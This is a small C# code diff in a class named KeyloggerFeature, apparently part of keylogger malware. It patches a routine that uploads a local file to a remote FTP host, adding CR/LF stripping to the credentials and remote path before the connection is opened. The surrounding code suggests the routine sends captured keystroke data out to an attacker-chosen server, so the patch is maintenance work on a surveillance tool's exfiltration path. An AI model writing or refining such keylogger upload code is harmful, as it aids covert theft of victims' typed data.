@@ -299,6 +299,9 @@ internal static class KeyloggerFeature
 
     private static async Task FtpUploadAsync(string localPath, string host, int port, string user, string pass, string remotePath)
     {
+        user       = user.Replace("\r", "").Replace("\n", "");
+        pass       = pass.Replace("\r", "").Replace("\n", "");
+        remotePath = remotePath.Replace("\r", "").Replace("\n", "");
         using var ctrl = new TcpClient();
         await ctrl.ConnectAsync(host, port).WaitAsync(TimeSpan.FromSeconds(15));
         var ns = ctrl.GetStream();
